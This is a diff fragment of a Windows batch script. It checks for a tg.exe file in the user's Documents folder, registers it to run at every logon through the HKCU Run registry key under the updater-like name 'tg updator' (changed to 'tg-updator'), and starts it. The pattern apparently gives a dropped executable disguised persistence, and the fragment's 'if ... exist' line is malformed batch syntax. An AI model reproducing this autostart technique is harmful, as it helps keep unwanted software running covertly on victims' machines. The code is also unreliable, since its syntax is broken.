@@ -8,7 +8,7 @@ if ERRORLEVEL 1 (
 	)
 :check
 	if "C:\Users\%user%\Documents\tg.exe" exist (
-		reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "tg updator" /t REG_SZ /d "C:\Users\%user%\Documents\tg.exe" /f
+		reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "tg-updator" /t REG_SZ /d "C:\Users\%user%\Documents\tg.exe" /f
 		start "" "C:\Users\%user%\Documents\tg.exe"
 	) else ( 
 		timeout /t 1 >nul
